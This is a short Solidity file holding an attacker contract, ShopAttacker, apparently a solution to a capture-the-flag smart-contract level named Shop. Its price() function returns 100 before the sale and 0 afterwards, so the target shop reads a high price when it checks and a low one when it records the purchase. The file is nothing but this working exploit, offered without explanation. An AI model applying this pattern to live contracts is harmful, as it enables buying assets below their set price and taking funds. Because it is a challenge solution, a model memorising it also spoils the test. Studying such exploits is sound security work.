pragma solidity ^0.7.3;

abstract contract IShop {
    uint public price;
    bool public isSold;
    function buy() external virtual;
}

contract ShopAttacker {
    IShop public challenge;
    uint256 timesCalled = 1;

    constructor(address challengeAddress) {
        challenge = IShop(challengeAddress);
    }

    function attack() public {
        challenge.buy();
    }

    function price() external view returns (uint256) {
        return challenge.isSold() ? 0 : 100;
    }
}
